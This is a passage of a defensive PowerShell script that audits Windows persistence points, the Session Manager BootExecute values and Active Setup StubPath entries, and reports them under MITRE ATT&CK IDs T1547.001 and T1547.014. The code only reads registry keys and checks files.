            $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $view)
            $k = $base.OpenSubKey($rel, $false)
        } catch { $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out }
        if ($null -eq $k) { $out.State = 'nokey'; return $out }
    } else {
        try { $k = Get-Item -LiteralPath $Root -ErrorAction Stop }
        catch {
            if ($_.Exception -is [System.Management.Automation.ItemNotFoundException]) { $out.State = 'nokey'; return $out }
            $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out
        }
    }
    $names = @()
    try { $names = @($k.GetSubKeyNames()) }
    catch { $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out }
    $unread = New-Object System.Collections.Generic.List[string]
    $ents = New-Object System.Collections.Generic.List[object]
    foreach ($n in $names) {
        $sk = $null
        try {
            $sk = $k.OpenSubKey($n, $false)
            if ($null -eq $sk) { continue }
            $stub = ''; $stubKind = ''
            if (@($sk.GetValueNames()) -contains 'StubPath') {
                $stubKind = [string]$sk.GetValueKind('StubPath')
                if (@('String', 'ExpandString') -contains $stubKind) { $stub = [string]$sk.GetValue('StubPath', '', [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames) }
            }
            $inst = $sk.GetValue('IsInstalled', $null)
            $disp = $sk.GetValue('', $null)
            # Only a DWORD 0 is "switched off": Windows' own entries store
            # IsInstalled as a DWORD. Any other type is graded as installed, and named,
            # so a REG_SZ "0" cannot read as off while Windows runs it.
            $iv = ''
            if ($null -ne $inst) {
                $ik = [string]$sk.GetValueKind('IsInstalled')
                $iv = if ($ik -eq 'DWord') { [string]$inst } else { "${ik}:" + (@($inst) -join ' ') }
            }
            if ($stubKind) { $ents.Add(@{ Key = $n; Name = (Get-OneLine ([string]$disp)); Stub = $stub; StubKind = $stubKind; IsInstalled = $iv }) }
        } catch { $unread.Add($n) }
        finally { if ($sk) { $sk.Close() } }
    }
    $k.Close()
    $out.Unread = @($unread.ToArray()); $out.Entries = @($ents.ToArray())
    return $out
}

# This account's search path, in the order CreateProcess reads it: System32,
# the Windows folder, then PATH. (The folder Windows starts the command in,
# and another account's own PATH folders, are not known here.)
function Get-SearchDirs {
    $dirs = New-Object System.Collections.Generic.List[string]
    foreach ($d in @($script:sys32Dir, [string]$env:SystemRoot) + @(([string]$env:PATH) -split ';')) {
        $x = ([string]$d).Trim().Trim('"').Trim()
        if (-not $x) { continue }
        $x = Get-NormalWinPath $x
        if ($dirs -notcontains $x) { $dirs.Add($x) }
    }
    return @($dirs.ToArray())
}

$probeLive = { param([string]$p) Get-ImageFacts $p }
$driveKindLive = { param([string]$l) Get-DriveKind $l }
$script:searchDirs = @(Get-SearchDirs)
$script:pathSkipped = New-Object System.Collections.Generic.List[string]
# A name without a folder. Every candidate goes through Get-FileFacts like
# any other path, so a PATH folder on a network drive is never opened: it is
# counted, and said below.
$whichLive = {
    param([string]$n)
    foreach ($d in $script:searchDirs) {
        $c = Join-WinPath $d $n
        $f = Get-FileFacts $c $probeLive $driveKindLive
        if (@('signed', 'unsigned', 'unverified') -contains [string]$f.State) { return $c }
        if (@('notlocal', 'reparse', 'unread') -contains [string]$f.State -and $script:pathSkipped -notcontains $d) { $script:pathSkipped.Add($d) }
    }
    return ''
}
$sysRoot = $env:SystemRoot
$sysDrive = $env:SystemDrive
if (-not $sysDrive) { $sysDrive = $sysRoot.Substring(0, 2) }

# ---- 1. BootExecute and siblings (T1547.001) -----------------------------
'--- [T1547.001] BootExecute: native programs Session Manager runs before Windows starts ---'
$smKey = if ($CiSessionKey) { $CiSessionKey } else { 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' }
$reads = @{}
foreach ($v in $script:BootValues) { $reads[$v] = Read-RegValueState -KeyPath $smKey -Name $v }
$boot = Get-BootReport -Reads $reads -Probe $probeLive -DriveKind $driveKindLive -KeyLabel $smKey -SystemRoot $sysRoot
$boot.Lines
if ($boot.Sev -ne 'OK') {
    Write-WhenCaveat
    foreach ($h in @($boot.Hits)) { $w = Get-WhenLine -KeyPath $smKey -FilePath (Get-OpenPath $h); if ($w) { "  $(Get-CleanText $h)" + $w.Substring(1) } }
}
Write-Marker -Name 'bootexec' -Sev $boot.Sev
if ($boot.Gap -ne 'OK') { Write-Marker -Name 'bootexec_gap' -Sev $boot.Gap }

# ---- 2. Active Setup (T1547.014) -----------------------------------------
''
"--- [T1547.014] Active Setup: StubPath commands run at each user's next sign-in ---"
$asRoots = @()
if ($CiActiveSetupRoots.Count) {
    $first = $true
    foreach ($r in $CiActiveSetupRoots) { $asRoots += ,(Read-ActiveSetupRoot -Root $r -Required $first); $first = $false }
} else {
    $asRoots += ,(Read-ActiveSetupRoot -Root 'HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components' -Required $true)
    $asRoots += ,(Read-ActiveSetupRoot -Root 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Active Setup\Installed Components' -Required $false)
}
$as = Get-ActiveSetupReport -Roots $asRoots -Probe $probeLive -DriveKind $driveKindLive -Which $whichLive -SystemRoot $sysRoot -SystemDrive $sysDrive
$as.Lines
if ($script:pathSkipped.Count) {
    "[INFO] $($script:pathSkipped.Count) folder(s) on this account's PATH were not searched for a program named without its folder (not a plain folder on a local fixed drive, or not readable): $(Get-CleanText ((@($script:pathSkipped) | Select-Object -First 5) -join '; '))"
}
if ($as.Sev -ne 'OK') {
    Write-WhenCaveat
    foreach ($h in @($as.Hits)) {
        $fp = ''
        if ($h.File) { $fp = Get-OpenPath ([string]$h.File) }
        $w = Get-WhenLine -KeyPath $h.Key -FilePath $fp
        if ($w) { "  $(Get-CleanText ([string]$h.Key))" + $w.Substring(1) }
    }
}
Write-Marker -Name 'activesetup' -Sev $as.Sev
if ($as.Gap -ne 'OK') { Write-Marker -Name 'activesetup_gap' -Sev $as.Gap }
# Written last: the caller raises "produced no verdict" when it is absent.
Write-Marker -Name 'bootas_done' -Sev 'done'
